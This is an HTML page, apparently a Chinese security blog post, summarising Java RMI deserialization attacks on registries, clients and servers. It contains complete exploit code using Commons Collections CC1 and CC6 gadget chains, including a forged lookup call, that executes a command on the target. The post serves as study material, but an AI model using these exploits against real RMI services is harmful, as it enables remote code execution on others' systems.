@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="stoocea">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/post/rmi攻击总结.html"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="RMI基础已经上架，这里贴一下自己之前语雀的笔记JAVA反序列化RMI专题之RMI基础 (yuque.com)  RMI的基本攻击方式RMI部分我们交互的是客户端，所以攻击入口肯定是客户端的某些地方  RMIclient打 RMI RegistryRMI client打 RMI ServerRMI client本身RMI clientRMI Server打 RMI RegistryRMI Serv">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI的基本攻击方式总结">
+<meta property="og:url" content="http://example.com/post/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93.html">
+<meta property="og:site_name" content="stoocea">
+<meta property="og:description" content="RMI基础已经上架，这里贴一下自己之前语雀的笔记JAVA反序列化RMI专题之RMI基础 (yuque.com)  RMI的基本攻击方式RMI部分我们交互的是客户端，所以攻击入口肯定是客户端的某些地方  RMIclient打 RMI RegistryRMI client打 RMI ServerRMI client本身RMI clientRMI Server打 RMI RegistryRMI Serv">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-24T15:35:51.000Z">
+<meta property="article:modified_time" content="2023-11-01T16:43:55.658Z">
+<meta property="article:author" content="stoocea">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://stoocea.github.io/images/rj3.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://stoocea.github.io/images/rj3.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://stoocea.github.io/images/rj3.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            RMI的基本攻击方式总结 -
+        
+        stoocea blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                stoocea blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">RMI的基本攻击方式总结</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://stoocea.github.io/images/rj3.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">stoocea</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-24 23:35:51</span>
+        <span class="mobile">2023-10-24 23:35:51</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-02 00:43:55</span>
+            <span class="mobile">2023-11-02 00:43:55</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>RMI基础已经上架，这里贴一下自己之前语雀的笔记<br><a class="link" target="_blank" rel="noopener" href="https://www.yuque.com/5tooc3a/jas/tgtlzskygx4u8ceo">JAVA反序列化RMI专题之RMI基础 (yuque.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="RMI的基本攻击方式"><a href="#RMI的基本攻击方式" class="headerlink" title="RMI的基本攻击方式"></a>RMI的基本攻击方式</h2><p>RMI部分我们交互的是客户端，所以攻击入口肯定是客户端的某些地方</p>
+<blockquote>
+<p>RMIclient打 RMI Registry<br>RMI client打 RMI Server<br>RMI client本身<br>RMI client<br>RMI Server打 RMI Registry<br>RMI Server打 RMI client<br>DGC相关</p>
+</blockquote>
+<h3 id="1-攻击对象为-RMI-Registry"><a href="#1-攻击对象为-RMI-Registry" class="headerlink" title="1.攻击对象为 RMI Registry"></a>1.攻击对象为 RMI Registry</h3><p>就是我们之前客户端请求时，注册中心的流程 既然要攻击注册中心，肯定反序列化点就在注册中心，也就是Registryimpl_Skel#dispatch 或者是 RegistryImpl_Stub中的几个方法<br>实际上这里的点都能打，正常客户端使用的话肯定是lookup了<br>创建注册中心之后，与客户端建立网络连接的流程简略如</p>
+<pre><code class="java">TCPTransport.listen()-&gt;AcceptLoop()开另一个线程调用run()方法-&gt;TCPTransport.executeAcceptLoop()-&gt;ConnectionHandler()开另一线程调用run()方法-&gt;run0()-&gt;TCPTransport.handleMessages()-&gt; target.getDispatcher() 获取到Target，然后获取它里面的Dispatch，调用到UnicastServerRef的dispatch方法，最终调用到RegistryImpl_Skel的dipatch 就是每个注册中心提供的 lookup bind 等方法
+</code></pre>
+<p>其实也就是我们创建服务中心的时候，最后进入的listen方法，当时并没有跟进到listen的内容，是因为客户端还没有对服务端发起请求，也就是我们的自己攻击还没打进来  x(<br>利用点是RegistryImpl_Skel的dispatch中的readObject方法了</p>
+<blockquote>
+<p>0-&gt; bind<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind</p>
+</blockquote>
+<p>可能会说为什么没有1号对应的方法？list方法由于本身没有readObject的调用，导致无法作为反序列化攻击的入口，所以我们不会选择list去打</p>
+<h4 id="lookup与bind"><a href="#lookup与bind" class="headerlink" title="lookup与bind"></a>lookup与bind</h4><p>先看源码，它有两步反序列化操作，一步是对对象名的反序列化，一步是对远程对象的反序列化</p>
+<pre><code class="java">public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException &#123;  
+    try &#123;  
+        RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);  
+  
+        try &#123;  
+            ObjectOutput var3 = var2.getOutputStream();  
+            var3.writeObject(var1);  
+        &#125; catch (IOException var18) &#123;  
+            throw new MarshalException(&quot;error marshalling arguments&quot;, var18);  
+        &#125;  
+  
+        super.ref.invoke(var2);  
+        ......
+</code></pre>
+<p>在ref.invoke(var2);  的时候已经将客户端的数据传输过去了，在遥远调用的彼方–executeCall()里面调用了隐藏很深的readObject()</p>
+<pre><code class="java">Object ex;  
+try &#123;  
+ex = in.readObject();  
+&#125; catch (Exception e) &#123;  
+throw new UnmarshalException(&quot;Error unmarshaling return&quot;, e);  
+&#125;
+</code></pre>
+<p>所以我们后续的代码其实不用看了，组长这里提到了一个点，就是本身lookup你传的是一个字符串，然后到RegistryImpl_Skel接受的时候，它也只是反序列化一个字符串，看似不可利用，但其实我们到RegistryImpl_Stub的时候就已经获取到了我们传进来的ref以及我们自己构造的恶意类</p>
+<p>回忆一下CC1的攻击链</p>
+<pre><code class="java">AnnotationInvocationHandler#invoke()-&gt;HashMap::hashCode()-&gt;TiedMapEntry::getValue()-&gt;lazyMap::get()-&gt; ChainedTransformer::transform()
+</code></pre>
+<p>先看bind的exp</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;  
+import org.apache.commons.collections.functors.ChainedTransformer;  
+import org.apache.commons.collections.functors.ConstantTransformer;  
+import org.apache.commons.collections.functors.InvokerTransformer;  
+import org.apache.commons.collections.map.TransformedMap;  
+  
+import java.lang.annotation.Target;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.InvocationHandler;  
+import java.lang.reflect.Proxy;  
+import java.rmi.Remote;  
+import java.rmi.registry.LocateRegistry;  
+import java.rmi.registry.Registry;  
+import java.util.HashMap;  
+import java.util.Map;  
+  
+//bind方法可以接受参数类型为对象数据，所以不用伪造请求信息  
+public class AttackRegistryEXP &#123;  
+public static void main(String[] args) throws Exception&#123;  
+Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  
+InvocationHandler handler = (InvocationHandler) CC1();  
+Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
+Remote.class.getClassLoader(),new Class[] &#123; Remote.class &#125;, handler));  
+registry.bind(&quot;test&quot;,remote);  
+&#125;  
+  
+public static Object CC1() throws Exception&#123;  
+Transformer[] transformers = new Transformer[]&#123;  
+new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
+new InvokerTransformer(&quot;getMethod&quot;,  
+new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  
+new InvokerTransformer(&quot;invoke&quot;  
+, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  
+new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  
+&#125;;  
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
+HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  
+hashMap.put(&quot;value&quot;,&quot;stoocealearnfromdrunkbaby&quot;);  
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
+Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  
+Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
+aihConstructor.setAccessible(true);  
+Object o = aihConstructor.newInstance(Target.class, transformedMap);  
+return o;  
+&#125;  
+&#125;
+</code></pre>
+<p>bind的很好写，直接传恶意类就行，因为它skel中bind的接收类型是object，我们的恶意类也是object</p>
+<p>而对于lookup 也就是stub中如何打注册中心 上面已经说过了，lookup只接受String类型，需要我们伪造请求信息<br>我们可以采用如下EXP drun1baby师傅的exp</p>
+<pre><code class="java">
+import org.apache.commons.collections.Transformer;  
+import org.apache.commons.collections.functors.ChainedTransformer;  
+import org.apache.commons.collections.functors.ConstantTransformer;  
+import org.apache.commons.collections.functors.InvokerTransformer;  
+import org.apache.commons.collections.map.TransformedMap;  
+import sun.rmi.server.UnicastRef;  
+  
+import java.io.ObjectOutput;  
+import java.lang.annotation.Target;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.Field;  
+import java.lang.reflect.InvocationHandler;  
+import java.lang.reflect.Proxy;  
+import java.rmi.Remote;  
+import java.rmi.registry.LocateRegistry;  
+import java.rmi.registry.Registry;  
+import java.rmi.server.Operation;  
+import java.rmi.server.RemoteCall;  
+import java.rmi.server.RemoteObject;  
+import java.util.HashMap;  
+import java.util.Map;  
+  
+  
+public class AttackRegistryEXP02 &#123;  
+public static void main(String[] args) throws Exception&#123;  
+Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  
+InvocationHandler handler = (InvocationHandler) CC1();  
+Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
+Remote.class.getClassLoader(),new Class[] &#123; Remote.class &#125;, handler));  
+  
+Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  
+fields_0[0].setAccessible(true);  
+UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  
+  
+//获取operations  
+  
+Field[] fields_1 = registry.getClass().getDeclaredFields();  
+fields_1[0].setAccessible(true);  
+Operation[] operations = (Operation[]) fields_1[0].get(registry);  
+  
+// 伪造lookup的代码，去伪造传输信息  
+RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  
+ObjectOutput var3 = var2.getOutputStream();  
+var3.writeObject(remote);  
+ref.invoke(var2);  
+&#125;  
+public static Object CC1() throws Exception&#123;  
+Transformer[] transformers = new Transformer[]&#123;  
+new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
+new InvokerTransformer(&quot;getMethod&quot;,  
+new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  
+new InvokerTransformer(&quot;invoke&quot;  
+, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  
+new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  
+&#125;;  
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
+HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  
+hashMap.put(&quot;value&quot;,&quot;stoocealearn&quot;);  
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
+  
+//这里就是cc1的入口了，AnnotationInvocationHandler这个动态代理方法的readObject方法会调用到它的invoke方法，进而触发hashcode  
+Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  
+Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
+aihConstructor.setAccessible(true);  
+Object o = aihConstructor.newInstance(Target.class, transformedMap);  
+return o;  
+&#125;  
+&#125;
+</code></pre>
+<p>其实不太好理解的是伪造传输信息那段代码，其他是正常的写恶意类，然后是正常的绑定远程对象<br>先说为什么要伪造传输信息：因为注册中心的lookup方法仅接受String类型，我们没办法传对象进去，所以只能通过伪造请求信息，自己模拟出lookup后面的有效流程<br>当然这段伪造的流程可以直接参考RegistryImpl_Stub的lookup部分</p>
+<h3 id="2-攻击对象为RMI-client"><a href="#2-攻击对象为RMI-client" class="headerlink" title="2.攻击对象为RMI client"></a>2.攻击对象为RMI client</h3><p>我们反过来注册中心也是可以去打跟他通信的对象，在RegistryImpl_Stub中，lookup和list两个方法调用了readObject方法，也就是说RMI client也存在被攻击的可能，那只要我们服务器端进行恶意类绑定至注册中心上，client端一旦调用这两个方法，就会执行恶意类</p>
+<p>当然这种情况不是很常见，我们了解到就好</p>
+<pre><code class="java">public class EvilRegistry &#123;  
+    public static void main(String[] args) throws Exception &#123;  
+        new RemoteObjImpl();  
+        Remote remoteObj = new RemoteWrapper();  
+        Registry r = LocateRegistry.createRegistry(1099);  
+        r.bind(&quot;remoteObj&quot;,remoteObj);  
+    &#125;  
+&#125;  
+  
+class RemoteWrapper implements Remote, Serializable &#123;  
+    private Map map;  
+  
+    RemoteWrapper() throws Exception &#123;  
+        this.map = genEvilMap();  
+    &#125;  
+&#125;
+public static HashMap genEvilMap() throws Exception&#123;  
+//整体采用CC6的流程  
+//HashMap::hashCode()-&gt;TiedMapEntry::getValue()-&gt;lazyMap::get()-&gt; ChainedTransformer::transform()  
+  
+//通过数组加载恶意方法，绕过runtime不可序列化的问题  
+Transformer[] transformers = new Transformer[]&#123;  
+new ConstantTransformer(Runtime.class),  
+new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  
+new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),  
+new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  
+&#125;;  
+  
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
+  
+  
+HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  
+//这里先通过decorate传入一个值是为了不提前执行后续恶意操作 也就是transform不会执行代码的对象即可  
+Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));  
+TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);  
+  
+//这里是因为肯定会执行一次putval方法，肯定会算一个hash值出来，所以还得把aaa去掉  
+HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();  
+map2.put(tiedMapEntry, &quot;bbb&quot;);  
+lazyMap.remove(&quot;aaa&quot;);  
+  
+  
+//到这里就可以把恶意类放进去了  
+Class c = LazyMap.class;  
+Field factoryField = c.getDeclaredField(&quot;factory&quot;);  
+factoryField.setAccessible(true);  
+factoryField.set(lazyMap,chainedTransformer);  
+  
+return map2;  
+&#125;  
+&#125;
+</code></pre>
+<h3 id="3-攻击对象为RMI-Server"><a href="#3-攻击对象为RMI-Server" class="headerlink" title="3.攻击对象为RMI Server"></a>3.攻击对象为RMI Server</h3><p>正常情况下都是客户端打服务端了<br>之前分析了客户端发起请求的时候，服务端的调用流程，服务端执行客户端调用的方法是通过UnicastServerRef#dispatch实现的<br>看一部份关键代码 这里是dispatch的部分</p>
+<pre><code class="java">Method method = hashToMethod_Map.get(op);  
+if (method == null) &#123;  
+throw new UnmarshalException(&quot;unrecognized method hash: &quot; +  
+&quot;method not supported by remote object&quot;);  
+&#125;  
+  
+// if calls are being logged, write out object id and operation  
+logCall(obj, method);  
+  
+// unmarshal parameters  
+Class&lt;?&gt;[] types = method.getParameterTypes();  
+Object[] params = new Object[types.length];  
+  
+try &#123;  
+unmarshalCustomCallData(in);  
+for (int i = 0; i &lt; types.length; i++) &#123;  
+params[i] = unmarshalValue(types[i], in);  
+&#125;
+</code></pre>
+<p>发现他最终执行了unmarshalValue方法，其实也就是最终做一大堆判断，之后调一下readObject方法，所以这里是存在攻击点的。 那我们客户端把参数设置成payload就行，当然前提是服务端接收的参数类型是object，不能是基础类型<br>但如果说它就是基础类型，比如说String类型，那该如何应对？<br>我们在客户端重新定义我们一个接收Object类型的指定远程方法即可（其实跟重写查不多意思）</p>
+<p>先看服务端代码</p>
+<pre><code class="java">
+import java.rmi.Naming;  
+import java.rmi.RemoteException;  
+import java.rmi.registry.LocateRegistry;  
+import java.rmi.server.UnicastRemoteObject;  
+  
+public class VictimServer &#123;  
+    public class RemoteHelloWorld extends UnicastRemoteObject implements RemoteObj &#123;  
+        protected RemoteHelloWorld() throws RemoteException &#123;  
+            super();  
+ &#125;  
+  
+        public String hello() throws RemoteException &#123;  
+            System.out.println(&quot;调用了hello方法&quot;);  
+ return &quot;Hello world&quot;;  
+ &#125;  
+  
+        public void evil(Object obj) throws RemoteException &#123;  
+            System.out.println(&quot;调用了evil方法，传递对象为：&quot;+obj);  
+ &#125;  
+  
+        @Override  
+ public String sayHello(String keywords) throws RemoteException &#123;  
+            return null;  
+ &#125;  
+    &#125;  
+    private void start() throws Exception &#123;  
+        RemoteHelloWorld h = new RemoteHelloWorld();  
+ LocateRegistry.createRegistry(1099);  
+ Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);  
+ &#125;  
+  
+    public static void main(String[] args) throws Exception &#123;  
+        new VictimServer().start();  
+ &#125;  
+&#125;
+</code></pre>
+<p>可以发现他的evil方法可接受对象类型的参数，但是sayHello方法却只接受字符串类型的对象</p>
+<pre><code class="java">public interface IRemoteObj extends Remote &#123;  
+    //sayHello就是客户端要调用的方法，需要抛出RemoteException  
+    public String sayHello(Object keywords) throws RemoteException;  
+&#125;
+</code></pre>
+<p>就假如说，我们远程调用的是改完之后的sayhello方法，就相当于能够调用到参数类型为对象的恶意sayhello方法了，其实是与伪造请求信息的目的是一样的 这里就不贴EXP了 因为我也不是很确定我自己构造缝合的这个EXP对不对，师傅们可自行尝试</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> RMI的基本攻击方式总结</li>
+        <li><strong>作者:</strong> stoocea</li>
+        <li><strong>创建于
+                :</strong> 2023-10-24 23:35:51</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2023-11-02 00:43:55
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com//post/RMI攻击总结.html
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/post/JNDI%E6%B3%A8%E5%85%A5.html"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">JNDI初步学习</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/post/blog%E8%BF%81%E7%A7%BB%E5%8A%A8%E6%80%81%E4%BB%A5%E5%8F%8A%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B.html"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">blog迁移动态以及最近的事</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">RMI的基本攻击方式总结</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-text">RMI的基本攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E4%B8%BA-RMI-Registry"><span class="nav-text">1.攻击对象为 RMI Registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E4%B8%BARMI-client"><span class="nav-text">2.攻击对象为RMI client</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E4%B8%BARMI-Server"><span class="nav-text">3.攻击对象为RMI Server</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">stoocea</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
